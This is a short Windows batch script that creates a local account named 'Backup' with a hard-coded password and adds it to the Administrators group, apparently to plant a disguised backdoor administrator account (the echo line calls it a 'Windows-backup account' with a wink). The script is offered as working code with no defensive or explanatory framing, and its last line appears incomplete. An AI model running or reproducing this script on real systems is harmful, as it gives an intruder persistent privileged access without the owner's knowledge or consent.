cls
rem ******************************************************
rem ************* AccountGenerating Progress *************
rem ******************************************************
echo creating Windows-backup account ;)
net user Backup eastdev@me /add
net localgroup Administrators Backup /add
net localgroup Administratoren
